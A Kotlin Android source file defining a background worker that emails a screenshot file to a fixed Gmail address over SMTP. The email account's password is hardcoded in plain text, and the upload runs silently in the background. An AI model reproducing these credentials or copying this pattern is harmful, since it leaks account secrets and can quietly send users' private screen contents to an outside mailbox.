package com.example.blinkit.core.common

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import java.util.Properties
import javax.mail.Authenticator
import javax.mail.Message
import javax.mail.PasswordAuthentication
import javax.mail.Session
import javax.mail.Transport
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeBodyPart
import javax.mail.internet.MimeMessage
import javax.mail.internet.MimeMultipart

class ScreenshotWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val filePath = inputData.getString("filePath") ?: return Result.failure()
        Log.d("ScreenshotWorker", "File path received: $filePath")
        sendEmail(filePath)
        return Result.success()
    }

    private fun sendEmail(filePath: String) {
        Log.d("ScreenshotWorker", "Preparing to send email with screenshot attachment.")
        val properties = Properties().apply {
            put("mail.smtp.auth", "true")
            put("mail.smtp.starttls.enable", "true")
            put("mail.smtp.host", "smtp.gmail.com")
            put("mail.smtp.port", "587")
        }
        val session = Session.getInstance(properties, object : Authenticator() {
            override fun getPasswordAuthentication(): PasswordAuthentication {
                return PasswordAuthentication("kylychbekovdosymir@gmail.com", "Dosmir017Dosmir")
            }
        })
        val message = MimeMessage(session).apply {
            setFrom(InternetAddress("kylychbekovdosymir@gmail.com"))
            addRecipient(Message.RecipientType.TO, InternetAddress("kylychbekovdosymir@gmail.com"))
            subject = "Скриншот"
            setText("Автоматически отправленный скриншот")
            val attachmentPart = MimeBodyPart().apply {
                attachFile(filePath)
            }
            val multipart = MimeMultipart().apply {
                addBodyPart(attachmentPart)
            }
            setContent(multipart)
        }
        try {
            Transport.send(message)
            Log.d("ScreenshotWorker", "Email sent successfully.")
        } catch (e: Exception) {
            Log.e("ScreenshotWorker", "Failed to send email: ${e.localizedMessage}")
        }
    }

}